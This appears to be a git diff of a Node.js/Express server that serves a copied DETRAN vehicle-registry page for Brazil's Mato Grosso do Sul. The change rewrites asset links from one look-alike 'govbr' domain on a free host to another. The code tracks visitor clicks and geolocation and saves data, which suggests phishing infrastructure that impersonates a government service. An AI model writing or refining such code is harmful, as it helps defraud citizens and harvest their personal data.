@@ -397,7 +397,7 @@ app.post('/api/admin/buscar-cliques', autenticarAdmin, async (req, res) => {
 });
 
 // ============================================
-// ROTA PRINCIPAL: CONSULTA DETRAN - API NETLIFY
+// ROTA PRINCIPAL: CONSULTA DETRAN - API NETLIFY COM CSS CORRIGIDO
 // ============================================
 app.post('/consultar', async (req, res) => {
     try {
@@ -485,9 +485,25 @@ app.post('/consultar', async (req, res) => {
             usuario.estado = geo.estado;
         }
         
-        // RETORNA HTML ORIGINAL DO DETRAN
-        console.log('✅ Consulta realizada com sucesso!');
-        res.send(resposta2.data);
+        // CORREÇÃO DOS LINKS CSS/JS/IMAGENS
+        console.log('🔧 Corrigindo links CSS/JS/Imagens...');
+        let htmlCorrigido = resposta2.data;
+        
+        // Substitui TODAS as ocorrências do domínio antigo pelo novo
+        htmlCorrigido = htmlCorrigido
+            .replace(/https:\/\/detranmatogrossosul-govbr\.vercel\.app/g, 'https://meudetranms-govbr.netlify.app')
+            .replace(/detranmatogrossosul-govbr\.vercel\.app/g, 'meudetranms-govbr.netlify.app');
+        
+        // Substituição específica para caminhos relativos que começam com /_next/ ou /assets/
+        htmlCorrigido = htmlCorrigido
+            .replace(/href="\/_next\//g, 'href="https://meudetranms-govbr.netlify.app/_next/')
+            .replace(/src="\/_next\//g, 'src="https://meudetranms-govbr.netlify.app/_next/')
+            .replace(/src="\/assets\//g, 'src="https://meudetranms-govbr.netlify.app/assets/')
+            .replace(/url\(\/_next\//g, 'url(https://meudetranms-govbr.netlify.app/_next/')
+            .replace(/url\(\/assets\//g, 'url(https://meudetranms-govbr.netlify.app/assets/');
+        
+        console.log('✅ Consulta realizada com sucesso! CSS/JS/Imagens corrigidos.');
+        res.send(htmlCorrigido);
 
     } catch (error) {
         console.error('❌ Erro na consulta:', error.message);
@@ -1510,6 +1526,7 @@ const server = app.listen(PORT, () => {
     console.log('📊 Dados salvos em: /data/');
     console.log('📍 Geolocalização ativa');
     console.log('🚀 API: meudetranms-govbr.netlify.app');
+    console.log('🎨 CSS/JS/Imagens corrigidos automaticamente');
     console.log('🔑 Token fixo com seus dados');
     console.log('============================================');
 });
